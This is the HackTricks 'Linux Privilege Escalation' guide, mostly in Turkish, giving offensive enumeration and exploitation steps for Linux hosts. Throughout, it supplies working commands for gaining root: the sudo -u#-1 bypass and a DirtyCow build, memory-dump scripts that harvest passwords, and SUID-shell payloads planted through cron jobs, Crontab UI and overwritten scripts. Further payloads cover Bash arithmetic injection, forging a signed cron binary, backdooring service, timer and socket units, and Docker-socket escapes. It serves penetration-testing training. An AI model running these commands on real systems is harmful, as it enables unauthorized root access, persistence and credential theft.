# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Sistem Bilgileri

### İşletim Sistemi (OS) bilgileri

Çalışan işletim sistemi hakkında bilgi edinmeye başlayalım.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Eğer `PATH` değişkeni içindeki herhangi bir klasörde **yazma iznine sahipseniz** bazı libraries veya binaries'i hijack etmeniz mümkün olabilir:
```bash
echo $PATH
```
### Ortam bilgileri

Ortam değişkenlerinde ilginç bilgiler, şifreler veya API anahtarları var mı?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Kernel sürümünü kontrol edin ve escalate privileges elde etmek için kullanılabilecek bir exploit olup olmadığını kontrol edin.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
İyi bir güvenlik açığı olan kernel listesi ve bazı önceden **compiled exploits**'i şurada bulabilirsiniz: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Diğer sitelerde bulabileceğiniz bazı **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Bu siteden tüm güvenlik açığı olan kernel sürümlerini çıkarmak için şunu yapabilirsiniz:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Kernel exploitlerini aramaya yardımcı olabilecek araçlar:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (hedef sistemde çalıştırın, yalnızca kernel 2.x için exploitleri kontrol eder)

Her zaman **kernel sürümünü Google'da arayın**; belki kernel sürümünüz bazı kernel exploit'lerinde yazılıdır ve böylece bu exploit'in geçerli olduğunu teyit edebilirsiniz.

Ek kernel exploitation tekniği:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo version

Aşağıda görünen güvenlik açığı bulunan sudo sürümlerine dayanarak:
```bash
searchsploit sudo
```
sudo sürümünün güvenlik açığına sahip olup olmadığını bu grep ile kontrol edebilirsiniz.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo sürümleri 1.9.17p1'den önce (**1.9.14 - 1.9.17 < 1.9.17p1**) ayrıcalıksız yerel kullanıcıların sudo `--chroot` seçeneği aracılığıyla ayrıcalıklarını root'a yükseltmelerine izin verir, eğer `/etc/nsswitch.conf` dosyası bir kullanıcı tarafından kontrol edilen dizinden kullanılıyorsa.

Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Exploit'i çalıştırmadan önce, `sudo` sürümünüzün vulnerable olduğundan ve `chroot` özelliğini desteklediğinden emin olun.

For more information, refer to the original [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

Kaynak: @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg imza doğrulaması başarısız

Nasıl bu vuln exploit edilebileceğine dair bir **örnek** için **smasher2 box of HTB**'ye bakın.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Daha fazla sistem keşfi
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Olası savunmaları listeleme

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Eğer bir docker container içindeyseniz, ondan kaçmayı deneyebilirsiniz:


{{#ref}}
docker-security/
{{#endref}}

## Sürücüler

Neyin **mounted ve unmounted** olduğunu, nerede ve neden olduğunu kontrol edin. Eğer herhangi bir şey unmounted ise, onu mount etmeyi deneyebilir ve özel bilgileri kontrol edebilirsiniz.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Kullanışlı yazılımlar

Kullanışlı binaries'leri listeleyin
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Ayrıca, **herhangi bir compiler'ın yüklü olup olmadığını** kontrol edin. Bu, bir kernel exploit kullanmanız gerekiyorsa faydalıdır çünkü kullanacağınız makinede (veya benzer bir makinede) derlemeniz önerilir.
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Yüklü Zafiyetli Yazılımlar

Yüklü paketlerin ve servislerin **sürümünü** kontrol edin. Belki escalating privileges için suistimal edilebilecek eski bir Nagios sürümü (örneğin) vardır…\

Daha şüpheli görünen yüklü yazılımların sürümlerini manuel olarak kontrol etmeniz önerilir.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.

> [!NOTE] > _Bu komutlar çoğunlukla işe yaramayan çok fazla bilgi gösterecektir; bu nedenle yüklü yazılım sürümlerinin bilinen exploits için zafiyet içerip içermediğini kontrol eden OpenVAS veya benzeri uygulamaların kullanılması önerilir._

## İşlemler

Hangi **işlemlerin** çalıştırıldığını inceleyin ve herhangi bir işlemin olması gerekenden **daha fazla ayrıcalığa sahip olup olmadığını** kontrol edin (belki tomcat root tarafından mı çalıştırılıyor?).
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Also **check your privileges over the processes binaries**, maybe you can overwrite someone.

### Process monitoring

You can use tools like [**pspy**](https://github.com/DominicBreuker/pspy) to monitor processes. This can be very useful to identify vulnerable processes being executed frequently or when a set of requirements are met.

### Process memory

Some services of a server save **credentials in clear text inside the memory**.\
Normally you will need **root privileges** to read the memory of processes that belong to other users, therefore this is usually more useful when you are already root and want to discover more credentials.\
However, remember that **as a regular user you can read the memory of the processes you own**.

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: same uid'ye sahip oldukları sürece tüm işlemler hata ayıklanabilir. Bu, ptracing'in klasik çalışma şeklidir.
> - **kernel.yama.ptrace_scope = 1**: sadece bir parent işlem hata ayıklanabilir.
> - **kernel.yama.ptrace_scope = 2**: Sadece admin ptrace kullanabilir; çünkü CAP_SYS_PTRACE yetkisi gereklidir.
> - **kernel.yama.ptrace_scope = 3**: Hiçbir süreç ptrace ile izlenemez. Bir kez ayarlandığında, ptracing'i yeniden etkinleştirmek için reboot (yeniden başlatma) gerekir.

#### GDB

If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Belirli bir işlem kimliği için, **maps o sürecin sanal adres alanı içinde belleğin nasıl eşlendiğini gösterir**; ayrıca **her eşlenmiş bölgenin izinlerini** de gösterir. **mem** pseudo dosyası **işlemin belleğinin kendisini açığa çıkarır**. **maps** dosyasından hangi **bellek bölgelerinin okunabilir** olduğunu ve bunların offsetlerini biliriz. Bu bilgiyi **mem dosyasında seek yapıp tüm okunabilir bölgeleri bir dosyaya dump etmek** için kullanırız.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` sistemin **fiziksel** belleğine erişim sağlar, sanal belleğe değil. Çekirdeğin sanal adres alanına /dev/kmem ile erişilebilir.\
Genellikle, `/dev/mem` yalnızca **root** ve **kmem** grubu tarafından okunabilir.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump, Windows için Sysinternals araç setindeki klasik ProcDump aracının Linux için yeniden tasarlanmış halidir. Edinin: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Araçlar

Bir process'ın belleğini dump etmek için şunları kullanabilirsiniz:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Root gereksinimlerini manuel olarak kaldırabilir ve size ait olan process'i dump edebilirsiniz
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root gereklidir)

### Process Belleğinden Kimlik Bilgileri

#### Manuel örnek

Eğer authenticator process'in çalıştığını görürseniz:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
İşlemi dump edebilirsiniz (önceki bölümlere bakarak bir işlemin belleğini dump etmenin farklı yollarını bulabilirsiniz) ve bellekte credentials arayabilirsiniz:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Araç [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) bellekteki **düz metin kimlik bilgilerini** ve bazı **iyi bilinen dosyalardaki** bilgileri çalacaktır. Doğru çalışması için root ayrıcalıkları gerektirir.

| Özellik                                           | Süreç Adı             |
| ------------------------------------------------- | --------------------- |
| GDM parolası (Kali Desktop, Debian Desktop)       | gdm-password          |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon  |
| LightDM (Ubuntu Desktop)                          | lightdm               |
| VSFTPd (Aktif FTP bağlantıları)                   | vsftpd                |
| Apache2 (Aktif HTTP Basic Auth oturumları)        | apache2               |
| OpenSSH (Aktif SSH oturumları - sudo kullanımı)   | sshd:                 |

#### Arama Regex'leri/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zamanlanmış/Cron işleri

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

Bir web “Crontab UI” paneli (alseambusher/crontab-ui) root olarak çalışıyor ve yalnızca loopback'e bağlıysa, yine de SSH local port-forwarding ile ona ulaşabilir ve ayrıcalıklı bir iş oluşturup yükseltebilirsiniz.

Tipik zincir
- Loopback'a bağlı portu keşfet (örn. 127.0.0.1:8000) ve Basic-Auth realm'ini `ss -ntlp` / `curl -v localhost:8000` ile bul
- Kimlik bilgilerini operasyonel artefaktlarda bul:
- Yedekler/scriptler (`zip -P <password>` ile)
- systemd unit'ında `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tünelle ve oturum aç:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Yüksek ayrıcalıklı bir görev oluşturun ve hemen çalıştırın (SUID shell bırakır):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Kullanın:
```bash
/tmp/rootshell -p   # root shell
```
Güçlendirme
- Crontab UI'yi root olarak çalıştırmayın; özel bir kullanıcı ve en az ayrıcalıklarla sınırlandırın
- localhost'a bağlayın ve ek olarak erişimi firewall/VPN ile kısıtlayın; parolaları tekrar kullanmayın
- Unit files içine secrets gömmekten kaçının; secret stores veya yalnızca root erişimli EnvironmentFile kullanın
- İhtiyaç halinde çalıştırılan job'lar için audit/logging'i etkinleştirin

Zamanlanmış herhangi bir job'un zaafiyetli olup olmadığını kontrol edin. Belki root tarafından çalıştırılan bir scriptten faydalanabilirsiniz (wildcard vuln? root'un kullandığı dosyaları değiştirebilir misiniz? symlinks kullanmak? root'un kullandığı dizine belirli dosyalar oluşturmak?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron yolu

Örneğin, _/etc/crontab_ içinde PATH'i şu şekilde bulabilirsiniz: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Kullanıcı "user"ın /home/user üzerinde yazma iznine sahip olduğuna dikkat edin_)

Eğer bu crontab içinde root kullanıcısı PATH'i ayarlamadan bir komut veya script çalıştırmaya kalkarsa. Örneğin: _\* \* \* \* root overwrite.sh_\

Böylece, şu komutu kullanarak root shell elde edebilirsiniz:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron, wildcard içeren bir script kullanan (Wildcard Injection)

Bir script root tarafından çalıştırılıyorsa ve bir komut içinde “**\***” varsa, bunu beklenmedik şeyler (ör. privesc) için suistimal edebilirsiniz. Örnek:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Eğer wildcard bir yolun önünde yer alıyorsa, örneğin** _**/some/path/\***_ **, bu zafiyetli değildir (hatta** _**./\***_ **de değildir).**

Daha fazla wildcard exploitation tricks için aşağıdaki sayfayı okuyun:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash, ((...)), $((...)) ve let içindeki aritmetik değerlendirmeden önce parameter expansion ve command substitution gerçekleştirir. Eğer root bir cron/parser güvenilmeyen log alanlarını okuyup bunları bir aritmetik bağlamına sokuyorsa, bir saldırgan cron çalıştığında root olarak çalışan bir command substitution $(...) enjekte edebilir.

- Neden işe yarar: Bash'te genişletmeler şu sırayla gerçekleşir: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. Bu yüzden `$(/bin/bash -c 'id > /tmp/pwn')0` gibi bir değer önce yerine konur (komutu çalıştırarak), sonra kalan sayısal `0` aritmetikte kullanılır ve script hatasız devam eder.

- Tipik zafiyetli örnek:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Parsed log'a saldırgan kontrollü metin yazdırın, böylece sayısal görünen alan bir command substitution içerir ve bir rakamla biter. Komutunuzun stdout'a yazmadığından emin olun (veya çıktısını yönlendirin) ki aritmetik geçerli kalsın.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Eğer root tarafından çalıştırılan **cron script'ini değiştirebiliyorsanız**, çok kolay bir şekilde shell elde edebilirsiniz:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Root tarafından çalıştırılan script, **tam erişime sahip olduğunuz bir dizini** kullanıyorsa, o klasörü silmek ve sizin kontrolünüzde bir script'i sunan başka bir dizine **symlink klasörü oluşturmak** faydalı olabilir.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Custom-signed cron binaries with writable payloads
Blue teams bazen cron-driven binaries'ları "sign" ederken özel bir ELF bölümü döküp vendor string için grep yapar ve sonra bunları root olarak çalıştırır. Eğer o binary group-writable ise (örn., `/opt/AV/periodic-checks/monitor` sahibi `root:devs 770`) ve signing materyalini leak edebiliyorsanız, bölümü sahteleyip cron görevini ele geçirebilirsiniz:

1. Doğrulama akışını yakalamak için `pspy` kullanın. In Era, root `objcopy --dump-section .text_sig=text_sig_section.bin monitor` çalıştırdı, sonra `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` ve ardından dosyayı yürüttü.
2. Beklenen sertifikayı leaked key/config (from `signing.zip`) kullanarak yeniden oluşturun:
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Kötü amaçlı bir replacement oluşturun (örn., bir SUID bash bırakın, SSH anahtarınızı ekleyin) ve sertifikayı `.text_sig` içine gömün ki grep başarılı olsun:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Yürütme izinlerini koruyarak planlanmış binary'nin üzerine yazın:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Bir sonraki cron çalışmasını bekleyin; naive imza kontrolü başarılı olduğunda, payload'ınız root olarak çalışır.

### Frequent cron jobs

Süreçleri izleyerek her 1, 2 veya 5 dakikada bir çalıştırılan process'leri arayabilirsiniz. Belki bundan faydalanıp ayrıcalıkları yükseltebilirsiniz.

Örneğin, **1 dakika boyunca her 0.1s'de izlemek**, **en az çalıştırılan komutlara göre sıralamak** ve en çok çalıştırılan komutları silmek için şunu yapabilirsiniz:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Ayrıca kullanabilirsiniz** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (bu başlayan her süreci izleyecek ve listeleyecektir).

### Görünmez cron job'lar

Bir cron job oluşturmak mümkündür: bir yorumdan sonra **carriage return koyarak** (yeni satır karakteri olmadan), ve cron job çalışacaktır. Örnek (carriage return karakterine dikkat):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Servisler

### Yazılabilir _.service_ dosyaları

Herhangi bir `.service` dosyası yazıp yazamayacağınızı kontrol edin, eğer yazabiliyorsanız, bunu **değiştirebilirsiniz** böylece servis **başlatıldığında**, **yeniden başlatıldığında** veya **durdurulduğunda** **backdoor**'unuz **çalıştırılır** (belki makinenin yeniden başlatılmasını beklemeniz gerekir).\
Örneğin backdoor'unuzu .service dosyasının içine **`ExecStart=/tmp/script.sh`** ile oluşturun

### Yazılabilir servis ikili dosyaları

Aklınızda bulundurun, eğer servisler tarafından çalıştırılan ikili dosyalar üzerinde **yazma izinleriniz** varsa, onları backdoor'lar için değiştirebilirsiniz; böylece servisler tekrar çalıştırıldığında backdoor'lar çalıştırılır.

### systemd PATH - Relative Paths

systemd tarafından kullanılan **PATH**'i şu komutla görebilirsiniz:
```bash
systemctl show-environment
```
Eğer yolun herhangi bir klasörüne **yazabiliyorsanız**, **escalate privileges** yapabilirsiniz. **relative paths being used on service configurations** içeren dosyaları aramanız gerekir:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Sonra, yazma izniniz olan systemd PATH klasörü içine, **executable** ile **same name as the relative path binary** aynı ada sahip bir dosya oluşturun; servis savunmasız eylemi (**Start**, **Stop**, **Reload**) gerçekleştirmesi istendiğinde, sizin **backdoor** çalıştırılacaktır (ayrıcalıksız kullanıcılar genelde servisleri başlatıp durduramaz ama `sudo -l` kullanıp kullanamayacağınızı kontrol edin).

**Servisler hakkında daha fazla bilgi için `man systemd.service`'e bakın.**

## **Zamanlayıcılar**

**Zamanlayıcılar** `**.timer**` ile biten isimlere sahip systemd unit dosyalarıdır ve `**.service**` dosyalarını veya olayları kontrol eder. **Zamanlayıcılar**, takvim tabanlı zaman olayları ve monotonik zaman olaylarını dahili olarak destekledikleri ve asenkron çalıştırılabildikleri için cron'a bir alternatif olarak kullanılabilir.

Tüm zamanlayıcıları şu komutla listeleyebilirsiniz:
```bash
systemctl list-timers --all
```
### Yazılabilir timer'lar

Eğer bir timer'ı değiştirebiliyorsanız, onu systemd.unit içindeki mevcut birimleri (ör. `.service` veya `.target`) çalıştıracak şekilde yapılandırabilirsiniz.
```bash
Unit=backdoor.service
```
In the documentation you can read what the Unit is:

> Bu timer sona erdiğinde aktive edilecek unit. Argüman, eki ".timer" olmayan bir unit adıdır. Belirtilmemişse, bu değer suffix hariç timer unit ile aynı ada sahip bir service olarak varsayılır. (Yukarıya bakın.) Aktive edilen unit adı ile timer unit adı, suffix hariç aynı olacak şekilde adlandırılması tavsiye edilir.

Therefore, to abuse this permission you would need to:

- Yazılabilir bir ikili (binary) çalıştıran bazı systemd unit'lerini (ör. `.service`) bulun
- **executing a relative path** olan ve **systemd PATH** üzerinde **writable privileges**'a sahip olduğunuz bir systemd unit'i bulun (o executable'ı taklit etmek için)

**Learn more about timers with `man systemd.timer`.**

### **Timer'ı Etkinleştirme**

Bir timer'ı etkinleştirmek için root ayrıcalıklarına sahip olmanız ve şu komutu çalıştırmanız gerekir:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Dikkat: **timer** `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` konumunda ona bir symlink oluşturarak **etkinleştirilir**

## Soketler

Unix Domain Sockets (UDS), istemci-sunucu modellerinde aynı veya farklı makinelerde **süreçler arası iletişim** sağlar. Bunlar, bilgisayarlar arası iletişim için standart Unix descriptor dosyalarını kullanır ve `.socket` dosyaları aracılığıyla yapılandırılır.

Sockets `.socket` dosyaları kullanılarak yapılandırılabilir.

**`man systemd.socket` ile sockets hakkında daha fazla bilgi edinin.** Bu dosyanın içinde, yapılandırılabilecek birkaç ilginç parametre bulunur:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Bu seçenekler farklıdır ancak özetle **soketin nerede dinleyeceğini belirtmek** için kullanılır (AF_UNIX soket dosyasının yolu, dinlenecek IPv4/6 ve/veya port numarası vb.)
- `Accept`: Boolean bir argüman alır. Eğer **true** ise, **her gelen bağlantı için bir service instance spawn edilir** ve sadece bağlantı soketi ona iletilir. Eğer **false** ise, tüm dinleme soketleri kendileri **başlatılan service unit'e iletilir** ve tüm bağlantılar için sadece bir service unit spawn edilir. Bu değer, tek bir service unit'un tüm gelen trafiği koşulsuz olarak ele aldığı datagram soketleri ve FIFO'lar için göz ardı edilir. **Varsayılan olarak false**. Performans nedenleriyle, yeni daemon'ların yalnızca `Accept=no` için uygun şekilde yazılması önerilir.
- `ExecStartPre`, `ExecStartPost`: Bir veya birden çok komut satırı alır; bunlar sırasıyla dinlenen **sockets**/FIFO'lar **oluşturulup** bağlanmadan önce veya **sonra** **çalıştırılır**. Komut satırının ilk token'ı mutlak bir dosya adı olmalıdır, ardından proses için argümanlar gelir.
- `ExecStopPre`, `ExecStopPost`: Dinlenen **sockets**/FIFO'lar **kapatılıp** kaldırılmadan önce veya **sonra** **çalıştırılan** ek **komutlar**.
- `Service`: **Gelen trafik** üzerinde **etkinleştirilecek** service unit adını belirtir. Bu ayar yalnızca Accept=no olan soketler için izinlidir. Varsayılan olarak socket ile aynı adı taşıyan (sonek değiştirilmiş) service'a ayarlanır. Çoğu durumda bu seçeneği kullanmaya gerek olmamalıdır.

### Yazılabilir .socket dosyaları

Eğer **yazılabilir** bir `.socket` dosyası bulursanız, `[Socket]` bölümünün başına `ExecStartPre=/home/kali/sys/backdoor` gibi bir satır **ekleyebilirsiniz** ve backdoor soket oluşturulmadan önce çalıştırılacaktır. Bu nedenle, **muhtemelen makinenin yeniden başlatılmasını beklemeniz gerekecektir.**\
_Not: sistemin bu socket dosyası yapılandırmasını kullanıyor olması gerekir, aksi takdirde backdoor çalıştırılmaz_

### Yazılabilir soketler

Eğer herhangi bir **yazılabilir soket** tespit ederseniz (_burada config `.socket` dosyalarından değil, Unix Sockets'ten bahsediyoruz_), o soketle **iletişim kurabilir** ve belki bir zafiyetten faydalanabilirsiniz.

### Unix Soketlerini Listeleme
```bash
netstat -a -p --unix
```
### Ham bağlantı
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**İstismar örneği:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Bazı **sockets listening for HTTP** isteklerini dinleyenler olabilir (_.socket files hakkında konuşmuyorum, unix sockets olarak davranan dosyalardan bahsediyorum_). Bunu şu komutla kontrol edebilirsiniz:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Eğer soket **HTTP ile yanıt veriyorsa**, onunla **iletişim kurabilir** ve belki de **bazı güvenlik açıklarını istismar edebilirsiniz**.

### Yazılabilir Docker Socket

The Docker socket, often found at `/var/run/docker.sock`, is a critical file that should be secured. By default, it's writable by the `root` user and members of the `docker` group. Possessing write access to this socket can lead to privilege escalation. Here's a breakdown of how this can be done and alternative methods if the Docker CLI isn't available.

#### **Privilege Escalation with Docker CLI**

If you have write access to the Docker socket, you can escalate privileges using the following commands:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Bu komutlar, host'un dosya sistemine root seviyesinde erişime sahip bir container çalıştırmanıza izin verir.

